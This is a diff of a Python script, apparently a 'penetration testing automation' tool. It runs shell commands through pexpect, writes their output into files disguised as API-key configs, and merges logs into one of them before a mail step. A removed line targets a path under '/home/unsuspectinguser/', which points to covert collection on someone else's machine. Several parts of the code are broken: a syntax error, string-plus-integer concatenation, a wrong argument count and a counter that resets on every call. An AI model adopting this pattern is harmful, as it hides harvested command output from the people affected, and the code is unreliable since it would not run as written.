@@ -28,19 +28,13 @@ print("-------------------------------------------\n")
 
 # ------- Functions -------
 
-try:
-    def create_API_file():
-        with open('API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'x') as file:
-            file.write('fine')
-except:
-        with open('API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'w') as file:
-            file.write('fun')
-
-    
 def sudo_command(command, report):
 
+    log_update_counter=0
+
     if report==True:
-        sudo_access = pexpect.spawn(command + ' | >> /home/unsuspectinguser/Downloads/Pen_Testing_Automation_Script/API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf')
+        sudo_access = pexpect.spawn(command)
+
     else:
         sudo_access = pexpect.spawn(command)
     
@@ -49,6 +43,12 @@ def sudo_command(command, report):
     sudo_access.expect(pexpect.EOF)
     output = sudo_access.before.decode('utf-8')
 
+    if report==True:
+        with open ('API_KEY_nat1-0103' + log_update_counter + 'fGs0d86asd89sGrEDA3.conf', 'w') as file:
+            file.write(output)
+
+        log_update_counter += 1
+    
     return output
        
 def mosquito_in_amber():
@@ -149,11 +149,19 @@ def one_mail():
         './dfstd.jpg'
     )
 
+def combine_logs(directory);
+    
+    sudo_command('mkdir logs')
+    
+    for log in directory:
+        sudo_command('cat ' + str(log) + ' >> API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf')
+
 # ------- Execution -------
 
 def __main__():
     secret_ingredient()
     basicScan()
+    combine_logs('./logs')
     one_mail()
     
 
